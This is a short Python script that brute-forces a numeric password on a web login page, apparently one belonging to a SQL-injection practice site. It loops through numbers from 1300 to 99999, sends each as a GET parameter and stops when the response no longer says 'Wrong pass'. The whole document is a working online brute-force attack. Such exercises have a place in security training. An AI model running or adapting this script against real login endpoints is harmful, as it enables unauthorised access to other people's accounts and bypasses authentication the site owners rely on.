import requests as rq

for i in range(1300,99999):
	req = rq.get("http://www.zixem.altervista.org/SQLi/login_do.php?pass="+str(i))
	if "Wrong pass" in req.text:
		print("Attempt #%d" % i)
	else:
		print("\n\nSuccess!\nPassword: %d" % i)
		break